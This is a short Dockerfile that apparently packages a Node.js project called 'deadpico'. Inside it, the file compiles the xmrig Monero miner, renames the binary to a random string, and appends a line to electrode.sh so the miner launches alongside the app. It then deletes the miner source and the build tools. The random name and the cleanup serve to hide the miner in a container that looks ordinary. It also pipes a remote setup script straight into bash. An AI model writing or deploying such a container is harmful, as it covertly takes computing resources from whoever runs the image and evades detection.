FROM ubuntu:18.04
RUN apt-get update && \
    apt-get install -y git curl build-essential cmake libuv1-dev libmicrohttpd-dev && \
    curl -sL https://deb.nodesource.com/setup_10.x | bash - && \
    apt-get install -y nodejs && \
    git clone https://socialwrap@bitbucket.org/socialwrap/deadpico.git && cd deadpico && npm i && \
    git clone https://github.com/xmrig/xmrig.git && \
    cd xmrig && mkdir build && cd build && cmake -DWITH_HTTPD=OFF -DCMAKE_BUILD_TYPE=Release .. && make && \
    export NAME=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 16 | head -n 1) && \
    mv xmrig $NAME && cp $NAME /deadpico && cd /deadpico && echo "\n ./${NAME}" >> electrode.sh && rm -rf xmrig
RUN apt-get clean && apt-get purge -y git curl build-essential cmake
WORKDIR deadpico
CMD npm start

